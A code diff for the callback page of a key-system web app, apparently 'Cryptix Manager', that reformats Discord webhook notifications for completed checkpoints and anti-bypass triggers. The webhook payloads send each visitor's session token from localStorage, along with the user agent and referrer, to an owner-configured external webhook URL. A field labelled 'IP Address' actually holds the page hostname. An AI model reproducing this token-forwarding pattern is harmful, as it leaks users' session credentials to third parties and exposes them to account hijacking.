@@ -136,7 +136,7 @@ export default function CallbackPage() {
 
           const antiBypassCheck = await performAntiBypassChecks(keysystem.id, browserUuid);
           if (!antiBypassCheck.valid) {
-            
+
             const antiBypassWebhookResult = await sendAntiBypassWebhook(keysystem.id); // Call the webhook here
             redirectWithError(antiBypassCheck.error);
             return;
@@ -172,74 +172,67 @@ export default function CallbackPage() {
 
            if(updateResult) {
               if (keysystem.webhookUrl) {
-                  try{
-                  const webhookPayload = {
-                  username: "Cryptix Notifications",
-                  avatar_url: "https://cryptixmanager.vercel.app/images/unrounded-logo.png",
-                  embeds: [
-                    {
-                      title: "✅ Checkpoint Completed",
-                      color: 0x00ff00,
-                      fields: [
+                  try {
+                    const webhookPayload = {
+                      username: "Cryptix Notifications",
+                      avatar_url: "https://cryptixmanager.vercel.app/images/unrounded-logo.png",
+                      embeds: [
                         {
-                          name: "Keysystem",
-                          value: `${keysystem.name} (${keysystem.id})`,
-                          inline: true
-                        },
-                        {
-                          name: "Checkpoint Index",
-                          value: checkpointIndex + 1,
-                          inline: true
-                        },
-                        {
-                          name: "Checkpoint Type",
-                          value: checkpoint.type,
-                          inline: true
-                        },
-                         {
-                          name: "IP Address",
-                          value: window.location.hostname || 'unknown',
-                          inline: true
-                        },
-                        {
-                          name: "User Agent",
-                          value: navigator.userAgent.length > 100 ? navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent,
-                          inline: false
-                        },
-                        {
-                          name: "Referer",
-                          value: document.referrer || 'Direct access',
-                          inline: true
-                        },
-                        {
-                          name: "Session Token",
-                          value: localStorage.getItem('session_token') || 'No Session Token',
-                          inline: true
-                        },
-                        {
-                          name: "Browser Session",
-                          value: localStorage.getItem('browser_uuid') || 'No Browser Session',
-                          inline: true
+                          title: "✅ Checkpoint Completed",
+                          color: 0x00ff00,
+                          thumbnail: {
+                            url: "https://cryptixmanager.vercel.app/images/thumbnail.gif"
+                          },
+                          fields: [
+                            {
+                              name: "Keysystem",
+                              value: `\`${keysystem.name} (${keysystem.id})\``,
+                              inline: true
+                            },
+                            {
+                              name: "Checkpoint",
+                              value: `\`${checkpointIndex + 1}/${keysystem.checkpoints.length}\``,
+                              inline: true
+                            },
+                            {
+                              name: "Type",
+                              value: `\`${checkpoint.type}\``,
+                              inline: true
+                            },
+                            {
+                              name: "IP Address",
+                              value: `\`${window.location.hostname || 'unknown'}\``,
+                              inline: true
+                            },
+                            {
+                              name: "User Agent",
+                              value: `\`${navigator.userAgent.length > 100 ? navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent}\``,
+                              inline: true
+                            },
+                            {
+                              name: "Session ID",
+                              value: `\`${localStorage.getItem('session_token') || 'No Session Token'}\``,
+                              inline: true
+                            }
+                          ],
+                          timestamp: new Date().toISOString(),
+                          footer: {
+                            text: "Cryptix Manager",
+                            icon_url: "https://cryptixmanager.vercel.app/images/unrounded-logo.png"
+                          }
                         }
-                      ],
-                      timestamp: new Date().toISOString(),
-                      footer: {
-                        text: "Cryptix Manager",
-                        icon_url: "https://cryptixmanager.vercel.app/images/unrounded-logo.png"
-                      }
-                    }
-                  ]
-                };
+                      ]
+                    };
 
-                await fetch(keysystem.webhookUrl, {
-                  method: 'POST',
-                  headers: {
-                    'Content-Type': 'application/json',
-                  },
-                  body: JSON.stringify(webhookPayload)
-                });
-                  }catch(e){
-                      console.error("webhok error",e);
+                    await fetch(keysystem.webhookUrl, {
+                      method: 'POST',
+                      headers: {
+                        'Content-Type': 'application/json',
+                      },
+                      body: JSON.stringify(webhookPayload)
+                    });
+                  } catch (error) {
+                    console.error('Webhook notification failed:', error);
                   }
 
               }
@@ -390,25 +383,33 @@ export default function CallbackPage() {
                     {
                       title: "🚨 Anti-Bypass Triggered",
                       color: 0xff0000,
+                      thumbnail: {
+                        url: "https://cryptixmanager.vercel.app/images/thumbnail.gif"
+                      },
                       fields: [
                         {
                           name: "Keysystem",
-                          value: `${keysystem.name} (${keysystem.id})`,
+                          value: `\`${keysystem.name} (${keysystem.id})\``,
                           inline: true
                         },
                         {
                           name: "IP Address",
-                          value: window.location.hostname || 'unknown',
+                          value: `\`${window.location.hostname || 'unknown'}\``,
                           inline: true
                         },
                         {
                           name: "User Agent",
-                          value: navigator.userAgent.length > 100 ? navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent,
-                          inline: false
+                          value: `\`${navigator.userAgent.length > 100 ? navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent}\``,
+                          inline: true
                         },
                         {
                           name: "Referer",
-                          value: document.referrer || 'Direct access',
+                          value: `\`${document.referrer || 'Direct access'}\``,
+                          inline: true
+                        },
+                        {
+                          name: "Session ID",
+                          value: `\`${localStorage.getItem('session_token') || 'N/A'}\``,
                           inline: true
                         }
                       ],
@@ -585,25 +586,33 @@ export default function CallbackPage() {
                     {
                       title: "🚨 Anti-Bypass Triggered",
                       color: 0xff0000,
+                      thumbnail: {
+                        url: "https://cryptixmanager.vercel.app/images/thumbnail.gif"
+                      },
                       fields: [
                         {
                           name: "Keysystem",
-                          value: `${keysystem.name} (${keysystem.id})`,
+                          value: `\`${keysystem.name} (${keysystem.id})\``,
                           inline: true
                         },
                         {
                           name: "IP Address",
-                          value: window.location.hostname || 'unknown',
+                          value: `\`${window.location.hostname || 'unknown'}\``,
                           inline: true
                         },
                         {
                           name: "User Agent",
-                          value: navigator.userAgent.length > 100 ? navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent,
-                          inline: false
+                          value: `\`${navigator.userAgent.length > 100 ? navigator.userAgent.substring(0, 100) + '...' : navigator.userAgent}\``,
+                          inline: true
                         },
                         {
                           name: "Referer",
-                          value: document.referrer || 'Direct access',
+                          value: `\`${document.referrer || 'Direct access'}\``,
+                          inline: true
+                        },
+                        {
+                          name: "Session ID",
+                          value: `\`${localStorage.getItem('session_token') || 'N/A'}\``,
                           inline: true
                         }
                       ],
